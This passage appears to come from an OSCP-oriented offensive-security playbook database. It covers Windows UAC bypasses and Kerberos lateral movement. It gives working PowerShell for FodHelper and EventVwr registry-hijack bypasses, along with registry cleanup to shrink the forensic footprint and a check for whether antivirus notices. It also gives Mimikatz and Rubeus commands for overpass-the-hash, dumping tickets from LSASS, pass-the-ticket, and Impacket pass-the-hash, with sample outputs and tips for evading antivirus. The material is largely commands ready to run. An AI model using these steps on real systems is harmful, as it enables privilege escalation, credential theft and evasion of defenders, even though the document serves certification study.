""commands"": [""check-integrity-level"", ""fodhelper-uac-bypass"", ""check-integrity-level""], ""expected_outcome"": ""UAC bypassed in 2-3 minutes. High integrity shell obtained without UAC prompt. FodHelper technique works silently on Windows 10 builds 17134+."", ""why_this_works"": ""FodHelper.exe is Microsoft-signed binary with autoElevate manifest flag set to true. Registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command hijacks FodHelper's execution path. UAC trusts Microsoft binaries, so no prompt shown.""}, {""title"": ""Scenario 2: EventVwr UAC Bypass (Broader Compatibility)"", ""context"": ""FodHelper failed (older Windows version or patch applied). Need alternative bypass technique compatible with Windows 7-10."", ""approach"": ""Phase 1: Compatibility Check (1 minute)\n- Verify Windows version with 'ver'\n- Confirm UAC enabled with registry check\n- Run check-integrity-level to baseline\n\nPhase 2: EventVwr Exploitation (2 minutes)\n- Use eventvwr-uac-bypass to hijack registry path\n- Set HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n- Execute eventvwr.exe (also auto-elevates)\n\nPhase 3: Verification (1 minute)\n- Catch elevated reverse shell\n- Run check-integrity-level\n- Test privileged access (read C:\\Windows\\System32\\config\\SAM)"", ""commands"": [""check-integrity-level"", ""eventvwr-uac-bypass"", ""check-integrity-level""], ""expected_outcome"": ""UAC bypassed in 3-4 minutes. EventVwr technique works on Windows 7, 8, and 10. Broader compatibility than FodHelper."", ""why_this_works"": ""EventVwr.exe (Event Viewer) also has autoElevate manifest. Registry hijack at HKCU\\Software\\Classes\\mscfile\\shell\\open\\command redirects .msc file association. When EventVwr opens MMC console, our command executes with high integrity.""}, {""title"": ""Scenario 3: UAC Bypass Detection & Cleanup"", ""context"": ""Successfully bypassed UAC and completed privileged tasks. Need to validate detection risk and clean up artifacts to reduce forensic footprint."", ""approach"": ""Phase 1: Detection Testing (2 minutes)\n- Run uac-bypass-detection to check if bypass triggered EDR\n- Review event logs for suspicious registry modifications\n- Check UAC event ID 4657 (registry value modification)\n\nPhase 2: Artifact Cleanup (2 minutes)\n- Delete registry keys created by bypass\n- FodHelper: Remove HKCU\\Software\\Classes\\ms-settings\n- EventVwr: Remove HKCU\\Software\\Classes\\mscfile\n- Clear specific event log entries if possible\n\nPhase 3: Validation (1 minute)\n- Re-run uac-bypass-detection\n- Verify registry keys deleted with 'reg query'\n- Confirm cleanup successful"", ""commands"": [""uac-bypass-detection"", ""check-integrity-level""], ""expected_outcome"": ""Detection validated and artifacts cleaned in 4-5 minutes. Reduced forensic footprint. Understanding of EDR detection methods for UAC bypass."", ""why_this_works"": ""Registry-based bypasses leave artifacts in HKCU hive and event logs. Manual cleanup removes evidence but high integrity shell persists (already spawned). Detection testing identifies if EDR flagged the technique, informing future operational security decisions.""}]","[{""title"": ""Phase 1: Detection & Validation"", ""notes"": ""Always check current integrity level before attempting bypass. Prevents wasted time if already elevated. Also confirms UAC is actually enabled (bypass unnecessary if disabled)."", ""commands"": [{""id"": ""check-integrity-level"", ""example"": ""whoami /groups | findstr /i \""Mandatory Label\"""", ""shows"": ""Low: Mandatory Label\\Low Mandatory Level\nMedium: Mandator...""}]}, {""title"": ""Phase 2: Bypass Execution"", ""notes"": ""Try FodHelper first (fastest, Windows 10 only). If fails or older OS, use EventVwr (broader compatibility). Both require user in local Administrators group\u2014if not admin, use different privesc method."", ""commands"": [{""id"": ""fodhelper-uac-bypass"", ""example"": ""# Create registry structure\nNew-Item \""HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\"" -Force\nNew-ItemProperty -Path \""HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\"" -Name \""DelegateExecute\"" -Value \""\"" -Force\nSet-ItemProperty -Path \""HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\"" -Name \""(default)\"" -Value \""cmd /c start powershell.exe\"" -Force\n\n# Trigger UAC bypass\nStart-Process \""C:\\Windows\\System32\\fodhelper.exe\"" -WindowStyle Hidden\n\n# Cleanup\nStart-Sleep -Seconds 3\nRemove-Item \""HKCU:\\Software\\Classes\\ms-settings\\\"" -Recurse -Force"", ""shows"": ""Payload executes with high integrity (admin) without UAC ...""}, {""id"": ""eventvwr-uac-bypass"", ""example"": ""# Create registry key\nNew-Item \""HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\"" -Force\nSet-ItemProperty -Path \""HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\"" -Name \""(default)\"" -Value \""cmd /c start powershell.exe\"" -Force\n\n# Trigger UAC bypass\nStart-Process \""C:\\Windows\\System32\\eventvwr.exe\"" -WindowStyle Hidden\n\n# Cleanup\nStart-Sleep -Seconds 3\nRemove-Item \""HKCU:\\Software\\Classes\\mscfile\\\"" -Recurse -Force"", ""shows"": ""EventVwr opens, payload executes with high integrity. Eve...""}]}, {""title"": ""Phase 3: Post-Exploitation & Cleanup"", ""notes"": ""After obtaining high integrity shell, complete privileged tasks immediately. Then clean up registry artifacts to reduce detection. Remember: high integrity session persists even after cleanup."", ""commands"": [{""id"": ""check-integrity-level"", ""example"": ""whoami /groups | findstr /i \""Mandatory Label\"""", ""shows"": ""Low: Mandatory Label\\Low Mandatory Level\nMedium: Mandator...""}, {""id"": ""uac-bypass-detection"", ""example"": ""# Test registry creation (no trigger)\nNew-Item \""HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\"" -Force\nNew-ItemProperty -Path \""HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\"" -Name \""DelegateExecute\"" -Value \""\"" -Force\nSet-ItemProperty -Path \""HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\"" -Name \""(default)\"" -Value \""cmd /c echo test\"" -Force\n\nWrite-Host \""Registry keys created. Check for AV alerts...\""\nStart-Sleep 10\n\n# Cleanup\nRemove-Item \""HKCU:\\Software\\Classes\\ms-settings\\\"" -Recurse -Force\nWrite-Host \""Cleaned up. No AV alert = bypass likely undetected.\"""", ""shows"": ""No AV alert = Bypass likely undetected. AV alert = Need a...""}]}]"
"ad-silver-ticket-methodology","Silver Ticket Attack Methodology","Complete workflow for forging Kerberos service tickets using service account password hashes. Silver tickets provide service-specific access with lower detection risk than Golden tickets.","OSCP:HIGH|ACTIVE_DIRECTORY|SILVER_TICKET|KERBEROS_ATTACKS|LATERAL_MOVEMENT|PERSISTENCE|METHODOLOGY","{}","[]","[]"
"ad-kerberos-lateral-movement","Kerberos Lateral Movement - Overpass-the-Hash and Pass-the-Ticket Attacks","Complete guide to Kerberos-based lateral movement: TGT/TGS ticket mechanics, overpass-the-hash (NTLM-to-Kerberos conversion), pass-the-ticket, ticket manipulation with Mimikatz/Rubeus","ACTIVE_DIRECTORY|KERBEROS|OVERPASS_THE_HASH|PASS_THE_TICKET|LATERAL_MOVEMENT|MIMIKATZ|RUBEUS|TGT|OSCP:MEDIUM","{""how_to_recognize"": [""You have NTLM hash but target tool requires Kerberos authentication (Microsoft PsExec.exe, certain COM objects)"", ""Need to use Kerberos ticket for lateral movement instead of NTLM pass-the-hash"", ""Mimikatz output shows 'kerberos::ptt' or Rubeus shows 'asktgt' commands with .kirbi files"", ""Tool fails with 'Kerberos authentication required' but you only have NTLM hash"", ""Want to understand difference between pass-the-hash (NTLM) vs. overpass-the-hash (Kerberos) vs. pass-the-ticket""], ""when_to_look_for"": [""After dumping NTLM hashes when Impacket tools (psexec, wmiexec) fail but you have access to compromised Windows machine"", ""When you need to use official Microsoft tools (PsExec64.exe from SysInternals) that only support Kerberos"", ""After obtaining Kerberos .kirbi ticket files from mimikatz/Rubeus dumps"", ""When time synchronization issues prevent direct Kerberos attacks (Golden/Silver tickets)"", ""OSCP exam: Kerberos lateral movement less common than NTLM but critical when NTLM path blocked - understand ticket lifecycle and klist verification""]}","[{""title"": ""Scenario 1: Understanding Kerberos vs. NTLM Authentication (Why Upgrade Hash to Ticket?)"", ""context"": ""You have NTLM hash '8846f7eaee8fb117ad06bdd830b7586c' for corp\\admin and successfully used it with Impacket psexec for lateral movement. Now you want to use Microsoft PsExec64.exe (official SysInternals version) but it fails with error: 'Access is denied'. Why does Microsoft tool fail when Impacket succeeds with same hash? This is authentication protocol difference: Kerberos vs. NTLM."", ""approach"": ""NTLM (Impacket): Challenge-response using hash directly. Works with Impacket tools (psexec, wmiexec, smbexec) because they implement NTLM natively. KERBEROS (Microsoft tools): Ticket-based authentication using TGT (Ticket Granting Ticket) and TGS (Service Ticket). Microsoft PsExec64.exe REQUIRES Kerberos - it won't accept NTLM. SOLUTION: Overpass-the-Hash = convert NTLM hash to Kerberos TGT. Technique: (1) Use Mimikatz to inject hash into LSASS, (2) Request TGT from domain controller using hash, (3) Use TGT to request service tickets, (4) Microsoft tools now work because they see valid Kerberos tickets in cache."", ""commands"": [""overpass-mimikatz-pth"", ""kerberos-klist-verify""], ""expected_outcome"": ""NTLM path (works with Impacket): 'impacket-psexec -hashes :8846f7... corp/admin@target' \u2192 Authentication uses NTLM challenge-response, no tickets needed, server validates hash against SAM/NTDS. KERBEROS path (required for Microsoft PsExec): Step 1 - Overpass-the-hash with Mimikatz: 'sekurlsa::pth /user:admin /domain:corp.com /ntlm:8846f7... /run:powershell' \u2192 New PowerShell spawns with injected credentials. Step 2 - Trigger Kerberos: 'net use \\\\DC01.corp.com' \u2192 Forces Kerberos pre-authentication, generates TGT. Step 3 - Verify tickets: 'klist' \u2192 Shows 'krbtgt/CORP.COM' (TGT) and 'cifs/DC01.corp.com' (TGS). Step 4 - Use Microsoft PsExec: 'PsExec64.exe \\\\TARGET cmd' \u2192 Works! Uses cached Kerberos tickets for authentication. INSIGHT: Same hash, different protocols. Impacket = NTLM-capable, Microsoft tools = Kerberos-only."", ""why_this_works"": ""Active Directory supports two authentication protocols: (1) NTLM - Legacy, challenge-response, hash-based. (2) Kerberos - Modern, ticket-based, time-sensitive. NTLM authentication: Client proves password knowledge by encrypting challenge with hash. Pass-the-hash works because you have the hash. KERBEROS authentication: Client requests TGT from KDC (Key Distribution Center = DC), uses TGT to request service tickets (TGS), presents TGS to target service. Overpass-the-Hash bridges these: Uses NTLM hash for Kerberos pre-authentication (requesting TGT), resulting TGT is legitimate Kerberos ticket, can be used for any Kerberos authentication. WHY NEEDED: Some Windows features ONLY support Kerberos (delegation, certain COM objects, Microsoft PsExec). Impacket tools support NTLM but Microsoft tools don't. Overpass-the-hash enables Kerberos-only tools with just hash - no password cracking needed.""}, {""title"": ""Scenario 2: Overpass-the-Hash with Mimikatz (NTLM to TGT Conversion)"", ""context"": ""You're on compromised Windows workstation (CORP\\helpdesk session) with Mimikatz uploaded. You have NTLM hash for CORP\\Administrator (31d6cfe0d16ae931b73c59d7e0c089c0) obtained from SAM dump. You need to use Microsoft PsExec64.exe to move laterally to file server, but PsExec requires Kerberos. You must convert hash to Kerberos TGT."", ""approach"": ""Step 1 - Launch Mimikatz as Administrator: 'mimikatz.exe', 'privilege::debug' (must return 'Privilege 20 OK'). Step 2 - Inject hash and spawn new process: 'sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe'. This spawns NEW PowerShell window with injected credentials in memory. Step 3 - From new PowerShell window, trigger Kerberos: 'net use \\\\DC01.CORP.COM' (MUST use hostname, not IP - Kerberos requires SPN). Step 4 - Verify tickets created: 'klist' (should show TGT and TGS). Step 5 - Use Microsoft PsExec: 'PsExec64.exe \\\\FILESERVER cmd'. Authentication uses cached tickets."", ""commands"": [""overpass-mimikatz-pth"", ""overpass-net-use-trigger"", ""kerberos-klist-verify"", ""psexec-sysinternals-interactive""], ""expected_outcome"": ""Mimikatz 'privilege::debug' output: 'Privilege '20' OK'. Mimikatz 'sekurlsa::pth' output: 'user : Administrator, domain : CORP, program : powershell.exe, NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0, | PID 4532 | TID 2108'. NEW PowerShell window appears (PID 4532). From new PowerShell: 'net use \\\\DC01.CORP.COM' \u2192 'The command completed successfully'. 'klist' output: 'Cached Tickets: (2) #0> Client: Administrator @ CORP.COM, Server: krbtgt/CORP.COM @ CORP.COM [TGT], #1> Client: Administrator @ CORP.COM, Server: cifs/DC01.CORP.COM @ CORP.COM [TGS]'. TGT and TGS present! 'PsExec64.exe \\\\FILESERVER cmd' \u2192 Interactive cmd.exe on FILESERVER. Overpass-the-hash succeeded - converted hash to usable Kerberos tickets."", ""why_this_works"": ""Mimikatz 'sekurlsa::pth' performs pass-the-hash by: (1) Spawning new process (powershell.exe), (2) Injecting NTLM hash into new process's LSASS memory space, (3) Process now has credentials cached (as if user logged in with password). When you run 'net use \\\\DC01' from this process, Windows: (1) Detects Kerberos SPN (cifs/DC01), (2) Initiates Kerberos pre-authentication, (3) Uses injected NTLM hash to compute pre-auth data, (4) Sends AS-REQ (Authentication Service Request) to KDC (DC), (5) KDC validates pre-auth and issues TGT, (6) Client requests TGS for cifs/DC01 service, (7) TGT and TGS cached in memory. KEY: Kerberos pre-authentication uses NTLM hash (encrypted timestamp) - same hash used in pass-the-hash. Once TGT obtained, it's legitimate Kerberos ticket valid for all Kerberos operations. Microsoft PsExec sees cached tickets via klist and uses them automatically.""}, {""title"": ""Scenario 3: Rubeus Alternative to Mimikatz (AV Evasion)"", ""context"": ""Mimikatz is heavily signatured by antivirus. You have NTLM hash and need Kerberos TGT but Mimikatz gets deleted by Windows Defender immediately upon upload. Rubeus is C# Kerberos toolkit less detected than Mimikatz - it can request TGTs using NTLM hash via asktgt command."", ""approach"": ""Rubeus 'asktgt' command requests TGT directly from KDC using NTLM hash. Syntax: 'Rubeus.exe asktgt /user:Administrator /domain:corp.com /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt'. The '/ptt' flag (pass-the-ticket) automatically imports ticket into current logon session. Alternative: Save ticket to file: 'Rubeus.exe asktgt /user:Administrator /domain:corp.com /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /outfile:admin.kirbi', then import: 'Rubeus.exe ptt /ticket:admin.kirbi'. Rubeus operates at higher level than Mimikatz (doesn't need SeDebugPrivilege, doesn't touch LSASS directly)."", ""commands"": [""kerberos-rubeus-asktgt"", ""kerberos-rubeus-ptt"", ""kerberos-klist-verify""], ""expected_outcome"": ""Rubeus asktgt output: '[*] Action: Ask TGT, [*] Using NTLM hash for user Administrator, [*] Building AS-REQ for: corp.com\\Administrator, [+] TGT request successful!, [*] base64(ticket.kirbi): doIFuj... [long base64 blob], [+] Ticket successfully imported!'. 'klist' verification: 'Cached Tickets: (1) #0> Client: Administrator @ CORP.COM, Server: krbtgt/CORP.COM @ CORP.COM, KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96, Ticket Flags: 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize'. TGT is now cached. Use Microsoft PsExec or any Kerberos tool: 'PsExec64.exe \\\\TARGET cmd' \u2192 Works! Rubeus bypasses AV better than Mimikatz because: (1) C# compiled on-demand (no static signature), (2) Doesn't access LSASS (no LSASS protection trigger), (3) Uses legitimate Kerberos APIs."", ""why_this_works"": ""Rubeus 'asktgt' sends AS-REQ (Authentication Service Request) directly to KDC using Windows Kerberos APIs. Process: (1) Builds AS-REQ with encrypted timestamp (uses NTLM hash for encryption), (2) Sends to KDC (DC) port 88 (Kerberos), (3) KDC validates encrypted timestamp (proves hash knowledge), (4) KDC issues AS-REP (Authentication Service Response) containing TGT, (5) Rubeus extracts TGT from AS-REP, (6) Imports TGT into Windows credential cache (same cache used by klist). This is IDENTICAL to legitimate Kerberos login - no exploitation, just using hash for pre-auth. Advantages over Mimikatz: (1) No LSASS interaction (no privilege::debug needed), (2) Operates in user-mode (no kernel/driver interaction), (3) Easier to obfuscate (C# can be compiled in memory, Invoke-Rubeus). Disadvantages: (1) Requires .NET Framework (usually present), (2) Less feature-complete than Mimikatz for other attacks.""}, {""title"": ""Scenario 4: Pass-the-Ticket (Using Existing Tickets)"", ""context"": ""You have SYSTEM shell on WORKSTATION01 and dumped Kerberos tickets from memory using Mimikatz ('sekurlsa::tickets /export'). This created .kirbi files on disk (0-40a10000-admin@krbtgt-CORP.COM.kirbi). You want to import these tickets on different machine or different user session to impersonate the ticket owner. This is Pass-the-Ticket attack."", ""approach"": ""Pass-the-Ticket = injecting existing Kerberos ticket into your session. Step 1 - Export tickets from compromised machine: Mimikatz 'sekurlsa::tickets /export' (requires SYSTEM/admin) OR Rubeus 'dump /luid:0x3e7 /nowrap' (less invasive). Step 2 - Transfer .kirbi file to attacker machine or new session. Step 3 - Import ticket: Mimikatz 'kerberos::ptt 0-40a10000-admin@krbtgt-CORP.COM.kirbi' OR Rubeus 'ptt /ticket:admin.kirbi'. Step 4 - Verify: 'klist' shows imported ticket. Step 5 - Use ticket: Access resources as ticket owner (net use, PsExec, etc.)."", ""commands"": [""mimikatz-export-tickets"", ""kerberos-rubeus-ptt"", ""kerberos-klist-verify""], ""expected_outcome"": ""Mimikatz export output: '[00000000] Primary * NTLM, Administrator, krbtgt/CORP.COM, 0x40a10000, * Saved to file: 0-40a10000-Administrator@krbtgt-CORP.COM.kirbi'. Ticket file created on disk. Import on attacker workstation: Mimikatz 'kerberos::ptt 0-40a10000-Administrator@krbtgt-CORP.COM.kirbi' \u2192 '* File: 0-40a10000-Administrator@krbtgt-CORP.COM.kirbi: OK'. 'klist' verification: 'Cached Tickets: (1) #0> Client: Administrator @ CORP.COM, Server: krbtgt/CORP.COM @ CORP.COM [TGT]'. Test access: 'net use \\\\DC01.CORP.COM\\c$' \u2192 'The command completed successfully'. You're now authenticated as Administrator using stolen ticket. No password or hash needed - ticket is sufficient."", ""why_this_works"": ""Kerberos tickets are portable credentials stored in LSASS memory. When you authenticate with Kerberos, TGT and TGS tickets are cached in memory for reuse (avoids re-authenticating for each request). Mimikatz 'sekurlsa::tickets /export' extracts these tickets from LSASS and saves to .kirbi files (Kerberos ticket format). The ticket contains: (1) Client name (Administrator), (2) Service name (krbtgt for TGT, service name for TGS), (3) Session key (encrypted with service's key), (4) Ticket expiration time (default 10 hours for TGT), (5) Flags (forwardable, renewable, etc.). When you import ticket with 'kerberos::ptt', it's injected into YOUR session's credential cache. Windows doesn't validate WHERE ticket came from - it trusts tickets in cache. When you access resources, Windows presents cached ticket, service validates ticket (encrypted with service's secret key), access granted. LIMITATION: Tickets expire (TGT = 10 hours, TGS = varies). Stolen ticket stops working after expiration.""}, {""title"": ""Scenario 5: Ticket Manipulation Troubleshooting (Time Sync, SPN Issues)"", ""context"": ""Your overpass-the-hash or pass-the-ticket attack fails with errors: 'KRB_AP_ERR_SKEW' (time synchronization), 'KDC_ERR_S_PRINCIPAL_UNKNOWN' (SPN not found), 'KRB_AP_ERR_TKT_EXPIRED' (ticket expired). Kerberos is time-sensitive and SPN-dependent - troubleshooting requires understanding these constraints."", ""approach"": ""Time sync error (KRB_AP_ERR_SKEW): Kerberos requires client and server clocks within 5 minutes. Check: 'net time \\\\DC01' (shows DC time), sync: 'net time \\\\DC01 /set /y' (sync to DC). SPN error (KDC_ERR_S_PRINCIPAL_UNKNOWN): You used IP address instead of hostname. Kerberos REQUIRES hostnames for SPN construction. Fix: Use 'net use \\\\DC01.CORP.COM' not 'net use \\\\192.168.50.10'. Ticket expired: Check 'klist' output for EndTime. Re-request TGT if expired. Purge old tickets: 'klist purge', then re-run overpass-the-hash. Also verify domain connectivity - Kerberos needs DNS resolution and port 88 (Kerberos) accessible to DC."", ""commands"": [""kerberos-time-sync"", ""kerberos-klist-verify"", ""kerberos-purge-tickets""], ""expected_outcome"": ""Time sync check: 'net time \\\\DC01' \u2192 'Current time at \\\\DC01 is 11/8/2025 2:30:45 PM'. Local time: 11/8/2025 8:30:45 AM (6 hour difference). This exceeds 5-minute Kerberos tolerance \u2192 KRB_AP_ERR_SKEW. Fix: 'net time \\\\DC01 /set /y' \u2192 'The command completed successfully'. Retry overpass-the-hash \u2192 SUCCESS. SPN troubleshooting: 'net use \\\\192.168.50.10' \u2192 'KDC_ERR_S_PRINCIPAL_UNKNOWN'. Kerberos tried SPN 'cifs/192.168.50.10' but KDC only knows 'cifs/DC01.CORP.COM'. Fix: 'net use \\\\DC01.CORP.COM' \u2192 Success. Ticket expiration: 'klist' shows 'EndTime: 11/8/2025 12:30:45 PM', current time 1:00 PM \u2192 ticket expired. 'klist purge' \u2192 'Target: All existing tickets will be deleted. Continue? (Y/N) Y, Purging all tickets'. Re-run Rubeus asktgt \u2192 fresh TGT obtained."", ""why_this_works"": ""Kerberos security depends on time synchronization and SPN validation. TIME: Tickets contain timestamps to prevent replay attacks. If client clock is skewed >5 minutes from KDC, KDC rejects pre-auth (assumes replayed old request). This is SECURITY FEATURE but breaks attacks if attacker workstation clock differs from domain. Solution: Sync to DC time before Kerberos operations. SPN (Service Principal Name): Kerberos uses SPNs to identify services (format: service/hostname). When you access 'net use \\\\DC01', Windows constructs SPN 'cifs/DC01.CORP.COM' and requests TGS for that SPN. IP addresses don't have SPNs registered in AD \u2192 KDC can't issue ticket. Solution: Always use FQDN or NetBIOS name (not IP) for Kerberos operations. EXPIRATION: TGT default lifetime = 10 hours (configurable via GPO). After expiration, ticket is invalid. Client must re-authenticate to obtain new TGT. Stolen tickets stop working after expiration - this limits pass-the-ticket window.""}, {""title"": ""Scenario 6: When to Use Kerberos vs. NTLM Lateral Movement"", ""context"": ""You have NTLM hash and multiple lateral movement options: (1) Impacket pass-the-hash (NTLM), (2) Overpass-the-hash + Microsoft PsExec (Kerberos), (3) Pass-the-ticket with exported TGT. Which technique should you use? Decision depends on: tools available, target requirements, stealth considerations, time constraints."", ""approach"": ""Decision tree: FROM KALI \u2192 Use Impacket pass-the-hash (easiest, NTLM-based, no Windows machine needed). Tools: psexec, wmiexec, smbexec, Evil-WinRM. FROM COMPROMISED WINDOWS MACHINE \u2192 Overpass-the-hash if you need Microsoft tools (PsExec64.exe, COM objects requiring Kerberos). FROM DOMAIN CONTROLLER OR HIGH-PRIVILEGE MACHINE \u2192 Export tickets with Mimikatz, pass-the-ticket for impersonation. STEALTH CONSIDERATIONS: NTLM pass-the-hash = more common, easier to detect (hash never changes). Kerberos pass-the-ticket = stealthier (tickets expire, limited time window). OSCP EXAM: Prioritize Impacket (NTLM) for speed. Use Kerberos only when NTLM fails or exam specifically requires Microsoft tools."", ""commands"": [""pth-impacket-psexec"", ""overpass-mimikatz-pth"", ""kerberos-rubeus-ptt"", ""lateral-movement-decision-tree""], ""expected_outcome"": ""Scenario: You have hash for corp\\admin, you're on Kali, target has port 445 open. FAST PATH: 'impacket-psexec -hashes :fc525c... corp/admin@192.168.50.100' \u2192 Instant SYSTEM shell (30 seconds). SLOW PATH: Upload Mimikatz to compromised Windows machine, run overpass-the-hash, spawn PowerShell, trigger Kerberos, verify klist, download Microsoft PsExec64.exe, execute \u2192 Same result (10 minutes). OSCP TIME MANAGEMENT: Use Kerberos techniques only when: (1) Impacket blocked by network controls, (2) Target specifically requires Microsoft PsExec (rare in OSCP), (3) You already have TGT exported and want to reuse. Default to NTLM pass-the-hash for exam efficiency - save Kerberos for troubleshooting fallback."", ""why_this_works"": ""NTLM pass-the-hash advantages: (1) Works from Kali (no Windows machine needed), (2) Faster (no ticket request/verification), (3) Simpler (one command vs multi-step process), (4) Well-documented for OSCP. Kerberos advantages: (1) Works with Microsoft tools that don't support NTLM, (2) Tickets are time-limited (stealthier - stolen ticket expires), (3) Delegation support (can forward credentials), (4) Modern AD environments prefer Kerberos over NTLM. WHEN KERBEROS REQUIRED: (1) Microsoft PsExec64.exe (SysInternals version doesn't support NTLM), (2) Certain COM objects (DCOM may require Kerberos depending on configuration), (3) Constrained/unconstrained delegation scenarios. OSCP REALITY: Most exam machines accept NTLM. Kerberos techniques test depth of AD knowledge but aren't usually critical path to flags. Master NTLM first, learn Kerberos for completeness.""}]","[{""title"": ""Phase 1: Kerberos Fundamentals"", ""notes"": ""Kerberos authentication flow: (1) Client requests TGT from KDC (AS-REQ) with encrypted timestamp (uses NTLM hash or password), (2) KDC validates pre-auth and issues TGT (AS-REP), (3) Client requests service ticket TGS (TGS-REQ) using TGT, (4) KDC issues TGS (TGS-REP), (5) Client presents TGS to service, (6) Service validates ticket and grants access. KEY COMPONENTS: TGT = Ticket Granting Ticket (encrypted with krbtgt hash, valid 10 hours), TGS = Service Ticket (encrypted with service's hash, valid for specific service), SPN = Service Principal Name (identifies service, format: service/hostname)."", ""commands"": [{""id"": ""kerberos-klist-verify"", ""example"": ""klist"", ""shows"": ""Client: <USER> @ <DOMAIN>""}, {""id"": ""kerberos-time-sync"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 2: Overpass-the-Hash (NTLM to Kerberos)"", ""notes"": ""Convert NTLM hash to Kerberos TGT when target requires Kerberos authentication. METHOD 1 (Mimikatz): sekurlsa::pth injects hash into new process, net use triggers Kerberos pre-auth, TGT cached in memory. METHOD 2 (Rubeus): asktgt requests TGT directly from KDC using hash, ptt imports ticket. REQUIREMENTS: (1) Compromised Windows machine with admin access (Mimikatz) or user access (Rubeus), (2) NTLM hash for target account, (3) Network access to DC port 88 (Kerberos), (4) Time sync within 5 minutes of DC. USE CASES: Microsoft PsExec, Kerberos-only COM objects, delegation scenarios."", ""commands"": [{""id"": ""overpass-mimikatz-pth"", ""example"": ""mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell"", ""shows"": ""user : <USER>""}, {""id"": ""kerberos-rubeus-asktgt"", ""shows"": ""See command documentation""}, {""id"": ""overpass-net-use-trigger"", ""example"": ""net use \\\\files04"", ""shows"": ""The command completed successfully""}, {""id"": ""kerberos-klist-verify"", ""example"": ""klist"", ""shows"": ""Client: <USER> @ <DOMAIN>""}]}, {""title"": ""Phase 3: Pass-the-Ticket (Credential Theft)"", ""notes"": ""Export Kerberos tickets from compromised machine, import into attacker session for impersonation. EXPORT: Mimikatz sekurlsa::tickets /export (requires SYSTEM), Rubeus dump (less invasive). IMPORT: Mimikatz kerberos::ptt, Rubeus ptt /ticket. VERIFY: klist shows imported tickets. LIMITATIONS: (1) Tickets expire (TGT = 10 hours default), (2) Only work for services ticket was issued for (TGS), (3) TGT can request new TGS but expiration still applies. ADVANTAGES: No password or hash needed, ticket is sufficient credential. DETECTION: Less common than pass-the-hash, blue teams focus on NTLM."", ""commands"": [{""id"": ""mimikatz-export-tickets"", ""shows"": ""See command documentation""}, {""id"": ""kerberos-rubeus-ptt"", ""shows"": ""See command documentation""}, {""id"": ""kerberos-klist-verify"", ""example"": ""klist"", ""shows"": ""Client: <USER> @ <DOMAIN>""}, {""id"": ""kerberos-purge-tickets"", ""example"": ""klist purge"", ""shows"": ""Ticket cache purged successfully""}]}, {""title"": ""Phase 4: Kerberos Troubleshooting"", ""notes"": ""Common Kerberos errors: KRB_AP_ERR_SKEW = time sync issue (fix: net time /set), KDC_ERR_S_PRINCIPAL_UNKNOWN = SPN not found (use hostname not IP), KRB_AP_ERR_TKT_EXPIRED = ticket expired (request new TGT), KDC_ERR_PREAUTH_FAILED = wrong password/hash, KDC_ERR_C_PRINCIPAL_UNKNOWN = account doesn't exist. DEBUGGING STEPS: (1) Verify time sync with DC, (2) Use hostnames (not IPs) for SPN construction, (3) Check ticket expiration with klist, (4) Verify DNS resolution, (5) Confirm port 88 (Kerberos) accessible to DC, (6) Purge old tickets and retry."", ""commands"": [{""id"": ""kerberos-time-sync"", ""shows"": ""See command documentation""}, {""id"": ""kerberos-klist-verify"", ""example"": ""klist"", ""shows"": ""Client: <USER> @ <DOMAIN>""}, {""id"": ""kerberos-purge-tickets"", ""example"": ""klist purge"", ""shows"": ""Ticket cache purged successfully""}]}, {""title"": ""Phase 5: Technique Selection (NTLM vs Kerberos)"", ""notes"": ""NTLM pass-the-hash (default): Use from Kali with Impacket (psexec, wmiexec, smbexec, Evil-WinRM). Faster, simpler, well-documented for OSCP. Overpass-the-hash (when NTLM blocked): Use from compromised Windows machine when target requires Kerberos (Microsoft PsExec, COM objects). Slower, multi-step, requires Windows machine. Pass-the-ticket (opportunistic): Use when you've already dumped tickets from high-value target. Limited time window (ticket expiration). OSCP PRIORITY: Master NTLM first (80% of exam lateral movement), understand Kerberos for completeness and troubleshooting (20%)."", ""commands"": [{""id"": ""pth-impacket-psexec"", ""example"": ""impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73"", ""shows"": ""[*] Requesting shares on <TARGET>""}, {""id"": ""overpass-mimikatz-pth"", ""example"": ""mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell"", ""shows"": ""user : <USER>""}, {""id"": ""kerberos-rubeus-asktgt"", ""shows"": ""See command documentation""}, {""id"": ""lateral-movement-decision-tree"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 6: Post-Exploitation with Kerberos"", ""notes"": ""After successful Kerberos lateral movement: (1) Dump additional tickets - Mimikatz sekurlsa::tickets /export (steal other users' tickets from LSASS), (2) Request service tickets - Use TGT to request TGS for services (cifs, http, mssql), (3) Enumerate SPNs - setspn -T domain -Q */* (find all registered SPNs in domain for Kerberoasting), (4) Check delegation - Look for unconstrained/constrained delegation misconfigurations. Kerberos tickets are highly portable - export from one machine, use on another, impersonate users without passwords."", ""commands"": [{""id"": ""mimikatz-export-tickets"", ""shows"": ""See command documentation""}, {""id"": ""kerberos-rubeus-ptt"", ""shows"": ""See command documentation""}, {""id"": ""kerberos-klist-verify"", ""example"": ""klist"", ""shows"": ""Client: <USER> @ <DOMAIN>""}]}]"
